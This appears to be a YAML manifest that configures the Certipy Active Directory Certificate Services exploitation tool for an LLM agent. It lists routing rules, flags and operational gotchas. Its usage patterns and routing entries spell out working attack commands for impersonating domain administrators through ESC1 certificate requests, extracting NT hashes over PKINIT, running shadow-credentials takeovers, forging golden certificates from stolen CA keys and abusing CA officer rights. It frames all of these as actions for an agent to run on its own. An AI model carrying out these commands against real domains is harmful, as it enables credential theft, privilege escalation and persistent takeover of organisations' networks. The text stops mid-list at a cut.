name: certipy
kind: cli
binary: certipy
version: "5.0.4"
description: "Active Directory Certificate Services (AD CS) enumeration and exploitation via Certipy v5.0.4 (ly4k/Certipy, pip certipy-ad). Single binary `certipy` with sub-command architecture — `certipy <subcommand> [options]` — over 11 subcommands: find / req / auth / shadow / forge / template / ca / account / cert / parse / relay. Discovers Certificate Authorities and certificate templates, identifies ESC1 through ESC16 vulnerability classifications, requests certificates with attacker-controlled Subject Alternative Names (ESC1), performs enrollment agent abuse (ESC3), exploits template write access (ESC4), manages Certificate Authority operations for ESC7 (enable/disable templates, approve/deny requests, add/remove officers, backup CA key), forges Golden Certificates from compromised CA keys (ESC5), authenticates via PKINIT to obtain TGTs and NT hashes, manipulates Shadow Credentials (msDS-KeyCredentialLink) for account takeover, manages AD accounts (create/read/update/delete), converts certificate formats (PFX/PEM/key extraction), and performs offline ADCS analysis from BOF or registry exports. Outputs PFX certificates, ccache/kirbi Kerberos tickets, and JSON enumeration reports to /session/. Authentication supports password, NTLM hash (pass-the-hash), Kerberos ccache, and AES keys. Username format is user@domain (UPN, NOT domain/user). All flags use single-dash long form (-username, -dc-ip, -ca, -template) — NOT GNU-style `--username`. Native CLI; the LLM constructs the full certipy invocation. The legacy method handlers (find/request/authenticate/...) auto-inherit run_cli from BaseMCPServer (mcp-common 0.3.0); kind:cli is the new default."
image: "ghcr.io/silicon-works/mcp-tools-certipy:latest"
image_size_mb: 721
# Dual-clock model — most certipy ops are seconds-fast, but `find` against a
# large forest with many templates can run for several minutes; `ca -backup`
# (CA private key extraction) and `shadow auto` (full attack chain) can also
# stretch on slow DCs. idle catches a wedged container; max_runtime is the
# hard cap for the longest plausible certipy operation.
idle_timeout_seconds: 600       # 10 min
max_runtime_seconds: 7200       # 2 h — find on huge forest + retry chains
timeout_seconds: 7200
idle_timeout: 1800              # legacy field, retained for older clients
allow_multi_target: false       # certipy targets a single DC/CA per call

capabilities:
  - adcs_enumeration
  - certificate_request
  - pkinit_authentication
  - shadow_credentials
  - golden_certificate
  - template_manipulation
  - ca_management
  - esc1_exploitation
  - esc3_exploitation
  - esc4_exploitation
  - esc5_exploitation
  - esc7_exploitation
  - account_management
  - certificate_conversion
  - offline_adcs_analysis

routing:
  use_for:
    - "enumerate AD Certificate Services to find vulnerable certificate templates (ESC1-ESC16)"
    - "request a certificate with an attacker-controlled UPN to impersonate domain admin (ESC1)"
    - "authenticate to Active Directory using a PFX certificate via PKINIT to get a TGT and NT hash"
    - "exploit Shadow Credentials by adding a key credential to a target account's msDS-KeyCredentialLink"
    - "forge a Golden Certificate using a compromised CA private key for persistent domain access (ESC5)"
    - "save and modify certificate template configurations to make them vulnerable (ESC4 exploitation)"
    - "use enrollment agent certificates to request certs on behalf of other users (ESC3)"
    - "identify which certificate templates allow enrollee-supplied SANs for user impersonation"
    - "perform PKINIT authentication with a PFX to obtain Kerberos ccache and NT hash for pass-the-hash"
    - "check if AD CS Web Enrollment or RPC enrollment interfaces are exposed for relay attacks"
    - "exploit ESC7 by adding CA officer, enabling SubCA template, and approving pending requests"
    - "convert a certificate-based authentication into an NT hash for use with other AD tools"
    - "enumerate Certificate Authorities and their security settings in an Active Directory forest"
    - "create a backup of certificate template configuration before modifying it for exploitation"
    - "create a machine account for ADCS exploitation (RBCD, shadow credentials, enrollment)"
    - "convert a PFX certificate to PEM format for use with other tools"
    - "combine a separate key and certificate file into a PFX for certipy authentication"
    - "parse BOF output or Windows registry exports for offline ADCS vulnerability assessment"
    - "add or remove a CA officer for ESC7 exploitation (ManageCertificates permission)"
    - "extract CA private key via backup for golden certificate forging (ESC5)"
  never_use_for:
    - "NTLM relay to AD CS HTTP/RPC endpoints (use impacket.ntlmrelayx — certipy relay requires interactive long-running listener with external coercion trigger)"
    - "Kerberoasting or AS-REP roasting (use impacket — certipy handles certificates, not service ticket attacks)"
    - "LDAP enumeration without ADCS (use bloodhound or netexec — certipy only queries ADCS objects)"
    - "password spraying or brute-force (use kerbrute — certipy requires valid credentials)"
    - "cracking NT hashes obtained from PKINIT auth (use john or hashcat — certipy extracts hashes, cracking tools crack them)"
    - "BloodHound data collection (use bloodhound — certipy v5 removed BloodHound zip output)"
    - "coercing authentication for relay attacks (use PetitPotam/PrinterBug/Coercer — certipy is the relay receiver, not the coercion trigger)"
    - "NTLM relay listener setup (certipy relay requires interactive long-running listener — use impacket.ntlmrelayx instead)"
  triggers:
    - "certipy"
    - "ADCS"
    - "AD CS"
    - "certificate services"
    - "ESC1"
    - "ESC4"
    - "ESC7"
    - "ESC8"
    - "shadow credentials"
    - "golden certificate"
    - "PKINIT"
    - "certificate template"
    - "PFX"
    - "enrollment agent"
    - "machine account"
    - "computer account"
    - "certificate conversion"
    - "PFX to PEM"
    - "PEM to PFX"
    - "offline ADCS"
    - "BOF output"
    - "registry export"
    - "CA officer"
    - "CA backup"
    - "issuance policy"

phases:
  - enumeration
  - exploitation

requirements:
  network: true
  privileged: false

resources:
  memory_mb: 512
  cpu: 0.5

see_also:
  - tool: impacket
    reason: "Use ntlmrelayx for ESC8/ESC11 relay attacks, secretsdump with obtained NT hashes, or getTGT with obtained ccache files"
  - tool: bloodhound
    reason: "Collect AD relationship data to identify which users can enroll in vulnerable templates (enrollment permissions)"
  - tool: netexec
    reason: "Validate NT hashes obtained from PKINIT authentication across SMB, WinRM, LDAP, MSSQL"
  - tool: john
    reason: "Crack NT hashes if obtained via PKINIT authentication (hashcat mode 1000)"
  - tool: kerbrute
    reason: "Enumerate valid AD usernames before attempting certipy operations that require credentials"
  - tool: responder
    reason: "Capture NTLMv2 hashes via poisoning, then crack to obtain credentials for certipy authentication"
  - tool: hashcat
    reason: "Certipy authenticate extracts NT hashes (hashcat mode 1000). Use hashcat for cracking NTLM hashes, especially with mask or hybrid attacks."

# ── kind:cli specific sections ──────────────────────────────────────

target_extraction:
  # certipy invocation form: `certipy <subcommand> [options]` — there is NO
  # positional target. The DC is always specified via `-dc-ip` (IP) and/or
  # `-dc-host` (FQDN, used for Kerberos SPN resolution). The `-target` flag
  # specifies the SERVER the operation acts on (CA server, ldap server) and
  # is OPTIONAL — when absent, certipy resolves it from LDAP. `-target-ip`
  # is a numeric override.
  #
  # Precedence (first match wins):
  #   1. -target value     — explicit target (CA server / LDAP server hostname)
  #   2. -target-ip value  — explicit target IP (overrides hostname)
  #   3. -dc-ip value      — DC IP (always present in DC-bound operations)
  #   4. -dc-host value    — DC FQDN (Kerberos SPN resolution)
  #
  # NO positional_match rule — sub-commands (`find`, `req`, `auth`, ...) ARE
  # the first positional and must NEVER be picked as targets. Some
  # sub-commands also take a SECOND positional (e.g., `shadow auto`, `account
  # delete`, `parse <file>`) which is an action token or a local file path
  # — also never a target. The flag-based extraction is the ONLY correct
  # approach for certipy.
  - rule: "flag_value"
    flag: "-target"
    parse_as: "raw"
  - rule: "flag_value"
    flag: "-target-ip"
    parse_as: "raw"
  - rule: "flag_value"
    flag: "-dc-ip"
    parse_as: "raw"
  - rule: "flag_value"
    flag: "-dc-host"
    parse_as: "raw"

# certipy has no bulk-target ingest flag (no -tF / --targets-file). The
# closest is `parse <input_file>` which is OFFLINE analysis (no network);
# its argument is a local BOF/.reg path, not a target — and we deliberately
# don't extract from positionals to avoid mistaking it for a target.
reject_flags: []
reject_flags_reason: "certipy has no bulk-target ingest flag. The `parse` subcommand takes a local file path positional but is OFFLINE — no network access, so no scope risk. Do not reject any flag here."

# Per-tool value-taking flags whose values must NOT be confused with positional
# targets or with each other. certipy uses single-dash long form throughout
# (-username, -dc-ip, -ca, -template, -upn) — NOT GNU `--username`. Verified
# by reading mcp-server.py's _build_auth_args (line 410) and per-handler argv
# construction. UPN-shaped values (-u user@domain.local) MUST NOT be picked
# as a target (FQDN-shape).
value_flags:
  # ── Authentication (apply to most subcommands) ──
  - "-u"                   # short alias (less common in certipy than -username)
  - "-username"            # canonical: user@domain UPN format
  - "-p"
  - "-password"
  - "-hashes"              # NTLM hash, format :NT or LM:NT
  - "-aes"                 # AES key (NOT -aesKey — verified in source)
  - "-no-pass"             # boolean — listed for safety in flag-arg detection
  - "-k"                   # boolean Kerberos — listed for safety
  - "-d"
  - "-domain"
  # ── Targeting / DC ──
  - "-dc-ip"
  - "-dc-host"
  - "-target"
  - "-target-ip"
  - "-ns"                  # nameserver
  - "-dns-tcp"             # boolean — listed for safety
  - "-port"
  - "-scheme"              # ldap / ldaps
  - "-timeout"             # per-connection timeout (NOT overall execution)
  # ── find subcommand ──
  - "-output"              # output file prefix (find / parse — value-taking)
  - "-stdout"              # boolean — listed for safety
  - "-vulnerable"          # boolean
  - "-enabled"             # boolean
  - "-bloodhound"          # boolean (legacy; v5 removed)
  - "-old-bloodhound"      # boolean
  - "-text"                # boolean
  - "-json"                # boolean
  - "-dc-only"             # boolean — LDAP-only collection
  - "-sid"                 # SID (find: vuln assessment; req/forge: SAN)
  - "-oids"                # boolean
  # ── req subcommand ──
  - "-ca"                  # CA name (CASE-SENSITIVE, get from `find`)
  - "-template"            # template name (CASE-SENSITIVE)
  - "-upn"                 # UPN for SAN — UPN-shape MUST NOT be target
  - "-dns"                 # DNS hostname for SAN (FQDN-shape) — also NOT target
  - "-application-policies"
  - "-extension-sid"
  - "-key-size"
  - "-key-type"
  - "-key-pass"
  - "-pfx-pass"            # PFX password (often empty string '')
  - "-pfx-password"        # alt spelling — listed for safety
  - "-out"                 # output filename (req / forge / shadow)
  - "-on-behalf-of"        # ESC3 enrollment agent target — DOMAIN\user
  - "-pfx"                 # input PFX path (req -pfx for enrollment agent)
  - "-renew"               # boolean
  - "-archive-key"         # boolean
  - "-retrieve"            # request ID (integer) — ESC7 retrieve
  - "-web"                 # boolean — Web Enrollment transport
  - "-dcom"                # boolean — DCOM transport workaround
  - "-subject"             # cert subject DN
  # ── auth subcommand ──
  - "-cert"                # cert file path
  - "-key"                 # key file path
  - "-no-save"             # boolean — don't save ccache
  - "-print"               # boolean
  - "-kirbi"               # boolean — save .kirbi instead of .ccache
  - "-no-hash"             # boolean — skip NT hash via U2U
  - "-ldap-shell"          # boolean — DO NOT USE (interactive)
  # ── forge subcommand ──
  - "-ca-pfx"              # CA PFX path (with private key)
  - "-ca-password"
  - "-validity-period"     # integer days
  - "-issuer"
  - "-crl"                 # CRL distribution point URL
  - "-serial"              # custom serial number
  # ── ptt subcommand ──
  # (uses -pfx, -no-save — already listed)
  # ── relay subcommand ──
  - "-mode"                # AD CS endpoint mode (ESC8: web; ESC11: rpc)
  # ── shadow subcommand ──
  - "-account"             # target SAM account name
  - "-device-id"           # device ID UUID for remove/info actions
  # ── ca subcommand ──
  - "-enable-template"
  - "-disable-template"
  - "-issue-request"       # request ID (integer)
  - "-deny-request"
  - "-add-officer"         # user to grant ManageCertificates
  - "-remove-officer"
  - "-config"              # CA config string Machine\\CAName
  - "-list-templates"      # boolean
  - "-backup"              # boolean — extract CA private key (ESC5)
  # ── account subcommand ──
  - "-user"                # target SAM account
  - "-group"               # group DN
  - "-sam"                 # override SAM
  - "-spns"                # comma-separated SPNs
  - "-pass"                # account password (NOT auth password — namespace collision)
  # ── template subcommand ──
  - "-save-configuration"  # output JSON path
  - "-write-configuration" # input JSON path
  - "-write-default-configuration"  # boolean — overwrite with ESC1-vulnerable
  - "-force"               # boolean — skip confirmation prompts
  # ── cert subcommand (offline) ──
  - "-export"              # boolean — export to PFX
  - "-export-password"
  - "-nocert"              # boolean
  - "-nokey"               # boolean
  # ── parse subcommand (offline) ──
  - "-format"              # bof / reg
  - "-sids"                # comma-separated owned SIDs
  - "-published"           # comma-separated published template names
  - "-hide-admins"         # boolean
  # ── Output / general ──
  - "-debug"               # boolean
  - "-quiet"               # boolean
  - "-timestamp"           # boolean

usage_patterns:
  - name: "find vulnerable templates (ESC1-ESC16 enumeration)"
    command: "certipy find -username {user_at_domain} -password '{password}' -dc-ip {dc_ip} -vulnerable -stdout"
    when: "First-pass ADCS recon. -vulnerable filters output to only ESC-classified templates; -stdout dumps to console (no file). Use this to quickly identify exploitable templates and CAs in a domain. UPN format is mandatory — `user@domain.local`, NOT `domain\\user`. After identifying targets, re-run with `-output /session/<prefix>` to persist for sub-agents."

  - name: "find with persistent JSON+text output"
    command: "certipy find -username {user_at_domain} -password '{password}' -dc-ip {dc_ip} -json -text -output /session/certipy-find"
    when: "Full ADCS enumeration with persistent capture. Produces /session/certipy-find_*.json (machine-parseable) and /session/certipy-find_*.txt (human summary). Use the JSON for downstream programmatic analysis (e.g., extract CA names + template names for the next req call)."

  - name: "request certificate for ESC1 (impersonate user via UPN SAN)"
    command: "certipy req -username {user_at_domain} -password '{password}' -ca {ca_name} -template {template_name} -upn administrator@{domain} -dc-ip {dc_ip} -out /session/admin-cert"
    when: "ESC1 exploitation: request a certificate from a vulnerable template, injecting an attacker-controlled UPN into the SAN to impersonate a privileged user (commonly administrator@domain). The CA accepts the SAN and issues a cert that PKINIT will accept as the impersonated user. Output PFX lands at /session/admin-cert.pfx for the auth step. CA name and template are CASE-SENSITIVE."

  - name: "auth with PFX (PKINIT) to extract NT hash"
    command: "certipy auth -pfx /session/admin-cert.pfx -pfx-pass '' -dc-ip {dc_ip}"
    when: "After requesting a cert (or shadow / forge), authenticate via Kerberos PKINIT. Output: NT hash via U2U + ccache file. Empty `-pfx-pass ''` is the typical case — certipy generates PFX without a password unless you specified `-pfx-pass` on the request. Use `-no-save` to skip writing the ccache (in-memory only)."

  - name: "shadow credentials full chain (auto)"
    command: "certipy shadow auto -username {user_at_domain} -password '{password}' -account {target_account} -dc-ip {dc_ip}"
    when: "Shadow Credentials abuse: the attacker has GenericAll/GenericWrite/WriteProperty on `target_account`'s msDS-KeyCredentialLink. `auto` action does the full chain: add key cred → PKINIT auth → extract NT hash → remove key cred. Outputs target account's NT hash. NB: positional `auto` comes AFTER `shadow` and BEFORE flags."

  - name: "ptt — pass-the-ticket from a captured ccache"
    command: "certipy ptt -pfx /session/admin-cert.pfx -no-save"
    when: "Convert a PFX back into a usable Kerberos ticket without writing it to /etc/krb5.cc. Use `-no-save` to keep the ccache ephemeral. Often used after `forge` or `req` when you want to feed the ticket directly to certipy auth without a roundtrip."

  - name: "parse PFX (offline, format conversion)"
    command: "certipy parse /session/admin-cert.pfx"
    when: "Offline operation — no network, no auth required. Lists the certificate's properties (subject, SANs, EKU, validity). Useful for verifying a generated PFX before using it for auth, or for inspecting a captured cert. Input file is the FIRST POSITIONAL after `parse`."

  - name: "ESC7 — relay-free CA officer abuse"
    command: "certipy ca -username {user_at_domain} -password '{password}' -ca {ca_name} -enable-template SubCA -dc-ip {dc_ip}"
    when: "ESC7 step 1: enable the SubCA template on a CA where you have ManageCA rights. Follow with `req -template SubCA` (will be denied but produces request_id), then `ca -issue-request <id>` to approve, then `req -retrieve <id>` to fetch the issued cert. Single-dash long flags throughout — `-enable-template`, NOT `--enable-template`."

  - name: "ESC5 — forge a Golden Certificate from compromised CA key"
    command: "certipy forge -ca-pfx /session/CA.pfx -upn administrator@{domain} -out /session/golden"
    when: "After extracting a CA's certificate + private key (via `ca -backup` or external means), forge an arbitrary cert. The forged PFX (lands at /session/golden.pfx) impersonates any UPN you specify — combine with `auth` to get a TGT for that user. Survives password resets (unlike Golden Tickets)."

output_formats:
  # certipy primarily writes files. The `-output <prefix>` flag (find / parse)
  # produces `prefix_<n>.json` and `prefix_<n>.txt` in CWD. The `-out <name>`
  # flag (req / forge / shadow / cert) produces a single named file. The
  # `-stdout` boolean (find / parse) prints to stdout instead of files.
  - flag: "-output /session/{name}"
    format: "json+text"
    preferred: true
    notes: "find / parse — produces {name}_*.json (machine-parseable) and {name}_*.txt (human summary). Use UNIQUE prefixes per call to avoid collisions and certipy's interactive overwrite prompt."
  - flag: "-out /session/{name}"
    format: "pfx_or_pem"
    preferred: true
    notes: "req / forge / shadow / cert — produces a single output file with the chosen name + appropriate extension (.pfx for cert+key, .pem for cert only, .key for key only)."
  - flag: "-stdout"
    format: "text"
    preferred: false
    notes: "find / parse — print human-readable text summary to stdout instead of writing files. Useful for one-shot inspection but no file lands in /session/."
  - flag: "-bloodhound"
    format: "bloodhound_zip"
    preferred: false
    notes: "find — produces a BloodHound-compatible JSON zip. v5 of certipy REMOVED this output format (per upstream); use the dedicated bloodhound MCP tool for AD relationship collection."
  - flag: "-json"
    format: "json"
    preferred: false
    notes: "find / parse — boolean toggle that turns on JSON output (combine with -output for file, or default location is CWD). Always pair with -output to control where the file lands."

common_options:
  subcommand:
    - "FIRST POSITIONAL: subcommand — one of: find / req / auth / shadow / forge / template / ca / account / cert / parse / relay. REQUIRED. `relay` requires interactive long-running listener — prefer impacket-relay instead."
  targeting:
    - "-dc-ip IP: Domain Controller IP (REQUIRED for online operations). Used for LDAP and as DNS nameserver fallback."
    - "-dc-host FQDN: DC FQDN — REQUIRED for Kerberos SPN resolution when authenticating with `-k`. Without it, KDC_ERR_S_PRINCIPAL_UNKNOWN."
    - "-target HOST: target server (CA server, ldap server) hostname or IP. Optional — auto-resolved from LDAP. Override when the CA lives on a different host than the DC."
    - "-target-ip IP: numeric override of -target. Use when DNS is unreliable inside the container."
    - "-ns IP: DNS nameserver override (defaults to -dc-ip if omitted)."
    - "-dns-tcp: use TCP for DNS (boolean, default false). Enable for Docker reliability — UDP DNS is unreliable in some bridge networks."
    - "-port N: override default protocol port."
    - "-scheme NAME: ldap or ldaps. Force scheme when auto-detection picks the wrong one."
    - "-timeout N: per-connection timeout in seconds (NOT overall execution timeout — for that use the cli_in_container max_runtime)."
  authentication:
    - "-username USER@DOMAIN: UPN format MANDATORY (e.g., `administrator@corp.local`). NOT `corp\\administrator`."
    - "-password PASS: cleartext password. Use empty `''` only with `-no-pass` (null session)."
    - "-hashes :NTHASH: NTLM hash for pass-the-hash. Format `:NT` (LM half empty) or `LM:NT`. Note the leading colon for empty LM."
    - "-k: use Kerberos via KRB5CCNAME ccache (boolean). Pair with `-target <FQDN>` for SPN resolution."
    - "-aes HEX: Kerberos AES128 (32 hex) or AES256 (64 hex) key (verified `-aes`, NOT `-aesKey`)."
    - "-no-pass: null session — no password, no hash, no Kerberos (boolean). Required when no other credential is supplied."
  find:
    - "-vulnerable: filter output to only ESC1-ESC16 templates (boolean)."
    - "-enabled: filter to only enabled templates (boolean)."
    - "-dc-only: LDAP-only collection — no host enumeration (stealthier, boolean)."
    - "-sid SID: user SID for accurate vulnerability assessment (override the authenticated user's SID)."
    - "-oids: show issuance policy OIDs (ESC13/ESC15 analysis, boolean)."
    - "-output PREFIX: output file prefix (writes PREFIX_*.json and PREFIX_*.txt in CWD)."
    - "-stdout: print to stdout instead of files (boolean)."
    - "-json -text: emit both JSON (machine) and TXT (human) — usually paired with -output."
  req:
    - "-ca NAME: CA name (CASE-SENSITIVE — get from `find` output)."
    - "-template NAME: template name (CASE-SENSITIVE — get from `find` output)."
    - "-upn USER@DOMAIN: SAN UPN for impersonation (ESC1)."
    - "-dns HOSTNAME: SAN DNS for machine impersonation (e.g., `dc01.corp.local`)."
    - "-sid SID: SAN SID — required when StrongCertificateBindingEnforcement=2."
    - "-on-behalf-of DOMAIN\\\\user: ESC3 enrollment agent target."
    - "-pfx PATH: ESC3 enrollment agent PFX (input)."
    - "-pfx-pass PASS: PFX password (commonly empty `''`)."
    - "-out NAME: output filename (writes NAME.pfx)."
    - "-retrieve ID: ESC7 — fetch a previously denied request (after ca -issue-request)."
    - "-web: use HTTP Web Enrollment transport (boolean)."
    - "-dcom: use DCOM transport (boolean) — workaround for RPC_E_CALL_COMPLETE."
    - "-application-policies OIDS: ESC15 EKUwu — comma-separated application policy OIDs."
    - "-key-size N: RSA key size in bits (default 2048)."
    - "-renew: renew an existing cert instead of new request (boolean)."
  auth:
    - "-pfx PATH: input PFX file (REQUIRED). Obtained from req / forge / shadow."
    - "-pfx-pass PASS: PFX password (commonly empty `''`)."
    - "-no-save: don't write ccache to disk (boolean) — in-memory only."
    - "-kirbi: save TGT in .kirbi format instead of .ccache (boolean)."
    - "-no-hash: skip NT hash extraction via U2U (boolean) — only get the TGT."
    - "-username USER, -domain DOMAIN: override identity when cert has no UPN (machine certs)."
    - "-ldap-shell: DO NOT USE — interactive, breaks cli_in_container."
  shadow:
    - "POSITIONAL after `shadow`: action — one of `auto / list / add / remove / clear / info`. `auto` does add → auth → hash → remove (full chain)."
    - "-account NAME: target SAM account name (REQUIRED)."
    - "-device-id UUID: device ID for remove / info actions (get from list)."
    - "-out NAME: output filename for the auto/add PFX."
  forge:
    - "-ca-pfx PATH: compromised CA PFX (cert + private key, REQUIRED)."
    - "-ca-password PASS: CA PFX password."
    - "-upn USER@DOMAIN: forged UPN (impersonate user)."
    - "-dns HOSTNAME: forged DNS (impersonate machine)."
    - "-subject DN: certificate subject DN."
    - "-sid SID: object SID — required for StrongCertificateBindingEnforcement=2."
    - "-validity-period DAYS: validity in days (default 365)."
    - "-crl URL: CRL distribution point URL (e.g., `ldap:///`) — makes forged cert look legitimate."
    - "-serial NUM: custom serial number."
    - "-out NAME: output filename."
  ca:
    - "-ca NAME: CA name (REQUIRED)."
    - "-enable-template NAME: enable a template on this CA (ESC7 step 1)."
    - "-disable-template NAME: disable a template (cleanup)."
    - "-issue-request ID: approve a pending request (ESC7 step 3)."
    - "-deny-request ID: deny a pending request."
    - "-add-officer USER: grant ManageCertificates right (ESC7)."
    - "-remove-officer USER: revoke ManageCertificates."
    - "-backup: extract CA private key (ESC5, requires ManageCA + DCOM/RPC access — often local admin)."
    - "-config Machine\\\\CAName: required with -backup to specify which CA."
    - "-list-templates: list all templates published on the CA."
  template:
    - "-template NAME: template name (REQUIRED)."
    - "-save-configuration JSONFILE: save current config (backup before exploitation)."
    - "-write-default-configuration: overwrite with ESC1-vulnerable default (ESC4 attack)."
    - "-write-configuration JSONFILE: restore from saved config."
    - "-force: skip 'apply changes?' prompt (mandatory in non-interactive use)."
    - "-no-save: skip 'file exists, overwrite?' prompt — pair with -force."
  account:
    - "POSITIONAL after `account`: action — `create / read / update / delete`."
    - "-user NAME: target SAM account (REQUIRED)."
    - "-dns FQDN: account DNS hostname."
    - "-upn UPN: account UPN."
    - "-spns SPN1,SPN2: comma-separated SPNs."
    - "-pass PASS: account password (NOT the auth password — collision risk)."
  cert:
    - "Offline — no network. Convert between PFX/PEM/key formats."
    - "-pfx PATH: input PFX/P12."
    - "-key PATH, -cert PATH: input PEM key / cert."
    - "-out NAME: output filename (auto-suffixed .pem or .pfx)."
    - "-export: combine key+cert into PFX (boolean)."
    - "-nocert: key-only output (boolean)."
    - "-nokey: cert-only output (boolean)."
    - "-export-password PASS: protect output PFX with password."
  parse:
    - "Offline — no network. Analyze BOF / .reg exports without domain access."
    - "POSITIONAL after `parse`: input file path (BOF or .reg)."
    - "-format bof|reg: input format (default bof)."
    - "-sids SID1,SID2: comma-separated SIDs to consider 'owned' for vuln assessment."
    - "-published TPL1,TPL2: templates to consider as published in AD."
    - "-vulnerable / -enabled / -hide-admins / -stdout: same semantics as `find`."

gotchas:
  - "Sub-command MUST be the FIRST positional after `certipy`. `certipy find -dc-ip <ip>` is correct; `certipy -dc-ip <ip> find` produces argparse errors. The DSL's flag_value extraction does NOT extract the sub-command (correctly — sub-commands are not targets)."
  - "Single-dash long flags THROUGHOUT — `-username`, `-dc-ip`, `-target`, `-template`, `-pfx-pass`, `-on-behalf-of`. NOT GNU-style `--username`. This is unusual for a Python tool and the #1 source of confusing CLI errors. Verified against mcp-server.py's _build_auth_args."
  - "UPN format for `-username` is MANDATORY: `user@domain.local`. NOT `domain\\user` (which is impacket-style). The @domain suffix is required for certipy's LDAP bind."
  - "`-hashes :NTHASH` — note the LEADING COLON for an empty LM half (the typical case). Bare `NTHASH` without the colon is rejected. Full form `LM:NT` also works."
  - "`-pfx-pass ''` (EMPTY STRING) is the typical case for certipy-generated PFXes — they have no password unless `-pfx-pass <pwd>` was set during request. The empty string MUST be quoted (`''`) so the shell preserves it as an arg."
  - "Auth flag is `-aes` (3 letters), NOT `-aesKey` like impacket. Verified against mcp-server.py line 436."
  - "`req` may PROMPT 'Would you like to save the private key? (y/N):' on denied requests (ESC7 SubCA flow). The mcp-server.py wraps with `bash -c 'yes | certipy req ...'` to auto-confirm. cli_in_container does NOT pipe `yes` automatically — denial scenarios will hang on stdin EOF. WORKAROUND: invoke as `bash -c 'yes | certipy req ...'` explicitly when you expect a prompt."
  - "`account delete` also prompts for confirmation. Same `yes |` workaround applies. Verified against mcp-server.py line 2326."
  - "`auth -ldap-shell` is INTERACTIVE — DO NOT USE in cli_in_container. The shell would block forever waiting for stdin."
  - "Output files: `find -output PREFIX` produces `PREFIX_<n>.json`, `PREFIX_<n>.txt`. `req -out NAME` produces `NAME.pfx` (and `NAME.key` if request denied). PIN paths to `/session/<prefix>` for persistence — without it, certipy writes to its CWD which is `/app` inside the container and the files are LOST on container restart."
  - "`-vulnerable` filters `find` to ESC-classified templates only — most useful for ESC1-ESC15 enumeration. Combine with `-enabled` to drop disabled templates from the noise."
  - "Sub-command takes a SECOND POSITIONAL in some cases: `shadow auto`, `account delete`, `parse <file>`. The DSL's flag_value-only target extraction correctly avoids these positionals (none are targets)."
  - "Feature 28 dynamic recipes (RECIPE_DIR=/session/tool_recipes/certipy) are RETIRED for the kind:cli path — the LLM writes argv directly. Recipes still load for legacy method calls if /session/tool_recipes/certipy/ exists, but they're a dead branch under run_cli (REQ-TR-016)."
  - "Working directory: certipy chdir's to /session/certipy/ inside the container (mcp-server.py _ensure_work_dir line 969). When invoking from cli_in_container WITHOUT the legacy method, files land in the binary's CWD (likely /app). Always pin output paths with `-output /session/<prefix>` or `-out /session/<name>` for persistent capture."
  - "`-target` vs `-dc-ip` precedence in target_extraction: `-target` wins over `-dc-ip` because `-target` specifies the operation's actual target server (CA, LDAP), while `-dc-ip` is the DC for auth. When only `-dc-ip` is set (most common case), it IS the operation target."
  - "Certipy often EXITS 0 even on auth failure / connection failure. The legacy method handlers in mcp-server.py inspect output for error patterns (CERTSRV_E_*, KRB_AP_ERR_SKEW, STATUS_LOGON_FAILURE). cli_in_container does NOT have this classification — agents must pattern-match the output themselves. Use the `failure_signatures` below as a guide."
  - "Certipy v5 REMOVED the legacy `-old-bloodhound` zip output. Use the dedicated bloodhound MCP tool for BloodHound data collection."
  - "`relay` subcommand requires INTERACTIVE long-running listener mode with external coercion (PetitPotam, etc.). NOT suitable for cli_in_container — use impacket-relay (ntlmrelayx.py) instead."
  - "Kerberos `-k` requires `/etc/krb5.conf` configured with the realm. The legacy mcp-server.py auto-generates krb5.conf from `username@domain` (line 319 _ensure_krb5_conf). Under kind:cli the container has NO krb5.conf by default — Kerberos auth will fail with KRB5_CONFIG-related errors unless the agent first writes one (or pivots through `mcp_tool certipy <method>` which still calls _ensure_krb5_conf). Workaround: shell out via `bash -c \"cat > /etc/krb5.conf <<EOF\\n[libdefaults]\\n  default_realm = CORP.LOCAL\\n...EOF\\ncertipy ... -k\"`."
  - "Kerberos `-k` also needs `KRB5CCNAME` env pointing at the ccache. The legacy handlers read `ccache_path` and inject `{KRB5CCNAME: <path>}` into the subprocess env (line 307 _get_auth_env). kind:cli's run_cli does NOT auto-set KRB5CCNAME — agents must invoke as `bash -c \"KRB5CCNAME=/session/credentials/<user>.ccache certipy ... -k\"`."
  - "`find` and `parse` ALWAYS need `-json -text -output <prefix>` for usable output. The legacy handlers add these flags unconditionally (line 1407, 2481). kind:cli does NOT — bare `certipy find -username u -dc-ip ip` writes to CWD with default names and produces no JSON. Always pass `-json -text -output /session/<unique-prefix>`."
  - "`template` has NO native `read` mode — to inspect a template you must `-save-configuration <file.json>` and read the JSON back. Legacy mcp-server.py maps `action=read` to `-save-configuration` (line 2057). Under kind:cli, naked `certipy template -template T` produces no useful output."
  - "`cert` without `-out` prints PEM to stdout instead of writing a file. Legacy auto-generates an output path (line 2412). For downstream tool reuse, ALWAYS pass `-out /session/<name>.pem` (or `.pfx` with `-export`)."
  - "`req -out <name>`: legacy sanitizes UPN/username (`@`, `\\\\`, `/` → `_`) before passing to `-out` to avoid path-injection in the filename (line 1540). When invoking via kind:cli, agents should provide a SAFE filename — do not pass the raw UPN/SAM/DOMAIN\\\\user as `-out` value or certipy may write to unexpected paths."
  - "`auth` has NO output-prefix flag — certipy writes `<principal>.ccache` / `<principal>.kirbi` based on the cert. If a file with that name exists in CWD, certipy prompts \"Overwrite? (y/n)\" on stdin and aborts on EOF. Legacy backs up + restores any existing ccache/kirbi (lines 1706-1712). Workaround for kind:cli: invoke `auth` from a fresh `/session/<unique-prefix>/` working dir, OR pre-clean any stale `*.ccache`/`*.kirbi` in CWD via bash."
  - "`shadow auto`/`add`: legacy pre-deletes stale `<account>.ccache` and `<account>.pfx` to avoid the same overwrite prompt (lines 1872-1876). Under kind:cli, ALWAYS pass `-out /session/<unique-prefix>_<account>` to dodge the collision."
  - "`req -retrieve <id>` (ESC7) needs the saved private key visible as `<id>.key` in CWD. Legacy mcp-server.py searches for the most recent `*.key` and symlinks it as `<request_id>.key` (lines 1559-1571). Under kind:cli, the agent must `bash -c \"cd /session/certipy && ln -sf <prefix>.key <request_id>.key && certipy req -retrieve <id> ...\"` or copy the key file to the expected name."

failure_signatures:
  # Layer-diverse signals (SKILL #11) — at least 6 distinct verifiable layers:
  #   1. DNS  2. TCP  3. SMB / LDAP  4. Kerberos  5. AD CS / certsrv
  #   6. RPC / DCERPC  7. argparse
  - signal: "Could not resolve"
    remediation: "DNS resolution failed for the DC or target hostname. Verify -dc-ip is correct, /etc/hosts inside container, or pass -ns to override the nameserver. certipy uses the DC IP as the default nameserver."
  - signal: "Temporary failure in name resolution"
    remediation: "DNS unreachable — same root cause as 'Could not resolve'. Use -ns to override or use IP literals everywhere."
  - signal: "Connection refused"
